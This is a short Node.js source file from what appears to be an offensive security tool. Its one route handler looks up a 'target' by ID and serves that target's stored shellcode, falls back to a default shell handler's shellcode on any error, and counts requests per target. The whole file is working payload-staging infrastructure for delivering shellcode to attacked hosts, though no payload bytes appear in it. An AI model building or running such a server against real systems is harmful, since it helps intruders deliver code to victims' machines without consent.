// Copyright (c) 2012 Tom Steele
// See the file license.txt for copying permission

var Target = require('../../models/target');
var config = require('configure');

// look up and download shellcode
exports.download = function (req, res, next) {
  var id = req.params.id;
  res.setHeader('Content-Type', 'text/plain');

  // get shellcode based off of ObjectID
  Target.findById(id, function(err, target) {
    if (err) {
      console.log('[!] server error during download');
      console.log('[!] sending default shellcode, will likely go to default shell');
      res.send(200, config.default_handler.shellcode);
      return next();
    }
    // found the target. send the shellcode
    if (target) {
      res.send(200, target.shellcode);
      target.requests++;
      target.save();
      return next();
    }
    // target was not found. send default shellcode and print an error message
    console.log('[!] could not locate target' + id + ' in db');
    console.log('[!] sending default shellcode');
    res.send(200, config.default_handler.shellcode);
    return next();
  });
};
